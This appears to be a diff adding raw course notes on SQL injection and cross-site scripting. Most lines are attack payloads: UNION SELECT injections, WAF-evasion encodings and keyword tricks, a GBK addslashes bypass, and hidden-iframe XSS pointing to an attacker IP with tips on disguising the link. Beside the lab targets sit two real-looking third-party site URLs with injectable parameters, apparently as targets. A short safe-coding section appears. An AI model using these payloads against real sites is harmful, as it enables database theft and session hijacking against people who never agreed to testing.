@@ -1,0 +1,195 @@
+
+limit n,m
+	  0,1	
+	  1,1	
+	  
+SELECT * FROM users limit 1;  insert - update - delete    #,2	  
+SELECT * FROM users limit 1,100; select 1,2,3,4,5,6,7,8,9   #,2	  
+SELECT * FROM users limit 1,100; select 1 as id,2,3,4,5,6,7,8,9   #,2	  
+SELECT * FROM users limit 1,100; select user() as id,2,3,4,5,6,7,8,9   #,2	  
+SELECT * FROM users limit 1,100; select database()id,2,3,4,5,6,7,8,9   #,2	  
+
+
+SELECT * FROM users limit 1;  insert - update - delete    #,2
+
+
+
+Mg== -> base64 -> 2
+
+1' order by 100 %23 -> base64 -> 
+1' order by 1 %23 -> base64 -> 
+1' order by 100 # -> base64 -> 
+1' order by 1 # -> base64 -> 
+
+
+SELECT * FROM users WHERE id = '1' order by 100 # ' LIMIT 0,1
+SELECT * FROM users WHERE id = '1' order by 100 ,'1' LIMIT 0,1
+SELECT * FROM users WHERE id = '1' union select 1,2,3,4,5,6,7,8,9 from information_schema.tables where 1='1' LIMIT 0,1
+
+
+AND 1=1
+AnD 1=1
+
+AANDNANDD
+
+OORROR
+
+
+
+& -> %26%26
+
+|| ->
+
+
+/**/a/**/n/**/d/**/
+
+waf space removeIMIT 0,1 
+	mysql_*
+	%20 +
+	%A0 ->
+	%90 
+	%AD 
+	%7F 
+	%81 
+	%8F
+	%9D
+ 	%BF
+	%07
+	%08
+	%09
+	%0B
+	%0C	
+	%0D
+
+
+order by -> group by
+
+union -> UnIon
+select -> SeLect
+
+
+
+http://192.168.1.66/labs/sqli/33.php?id=-999999'+union%a0select%a01,2,3,4,5,6,7,8,9%a0from%a0infoorrmation_schema.tables%a0where%a01='1
+
+HTTP Parameter Pollution -> HPP 
+
+id=1&id=2+union
+
+
+ali.ir/test.php?id=1+union->
+
+/*!44100union*/
+
+192.168.1.2/test.php?id=1+union
+
+ali.ir
+reza.com
+
+192.168.1.2/~reza/
+
+GET ali.ir/test.php?id=1+union-
+POST ali.ir/test.php?id=1+union-
+
+addslashes = mysql_real_escape_string -> 
+		" -> \"
+		' -> \'
+%27
+
+
+
+addslashes = mysql_real_escape_string in gbk or utf7
+
+2 %ef' order by 1 #
+2 %bf' order by 1 #
+
+%af
+%5c
+
+mysqli_real_escape_string
+
+
+
+
+
+
+
+
+SELECT * FROM users WHERE id = 1
+
+information_schema.columns where table_name = 'ali'
+information_schema.columns where table_name = 0x
+
+
+Safe Code :
+int 
+	$id = (int)$_GET['id'];
+	ali -> 0
+	123 -> 123
+	123ali -> 123
+
+float
+	$id = (float)$_GET['id'];
+
+string
+	' OR "
+	$name = htmlentities($_GET['name'],ENT_QUOTES,'UTF-8');
+
+
+
+https://www.dt-shop.com/index.php?id=22&L=0&artnr=83079&pg=8&aw=182
+	
+XSS:
+
+	Cross Site Scripting -> XSS
+	JavaScript -> XSS
+	HTML -> Html Injection
+	XSS -> 
+			Client Hacking:
+				1 - Session & Cookie Hijacking
+				2 - Click Jacking
+				3 - Iframe Injection
+				4 - Phishing - Fake Page
+				5 - XSRF
+				6 - Paste Jacking
+			
+Type Xss:
+	1 - Reflected
+	2 - Store
+    3 - DOM 
+	
+<?php
+	$fn = $_GET['fn'];
+	print $fn;
+?>
+
+	1 - <h1>Test</h1>
+	2 - <script>alert('hack!');</script>
+	3 -> salam"> -> &gt;
+	
+	
+	<form action="salam"><h1>test</h1>  ">
+	<tag id="ali" style=reza data-x='test'></tag>
+
+	
+	
+	
+	
+	https://www.rewardsforrescue.co.uk/login.php?refer=/search.php?q=
+
+
+
+	<iframe src="http://192.168.1.51:8080"></iframe>
+	<iframe style="display:none;" src="http://192.168.1.51:8080"></iframe>
+
+
+
+
+	http://localhost/labs/xss/01.php?fn=<iframe style="display:none;" src="http://192.168.1.51:8080"></iframe>&btn_send=1
+	1 - shrot url
+	2 - http://ali.ir/vpn.php -> redirect
+	3 - http://ali.ir/vpn.php -> ajax - xhr 
+	
+	
+
+
+
